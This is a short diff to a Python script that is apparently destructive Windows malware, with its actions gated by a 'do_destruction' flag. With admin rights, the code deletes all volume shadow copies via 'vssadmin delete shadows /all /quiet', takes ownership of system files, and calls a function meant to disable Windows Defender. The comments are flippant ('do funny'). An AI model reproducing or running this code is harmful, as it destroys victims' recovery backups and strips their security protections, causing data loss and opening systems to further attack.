@@ -3,7 +3,6 @@ import ctypes
 import random as rand
 import tkinter.messagebox as tkMsg
 import tkinter
-import threading
 from functions import *
 
 #Variables
@@ -36,10 +35,16 @@ if do_destruction:
 
     #do funny
     if admCheck:
+        # delete shadows
         try:
             do_command('vssadmin delete shadows /all /quiet')
         except:
             print('bruh')
+
+        # take ownership of important shit
+        takeOwnership()
+    
+    # attempt to weaken system security
     try:
         ripDefender()
     except:
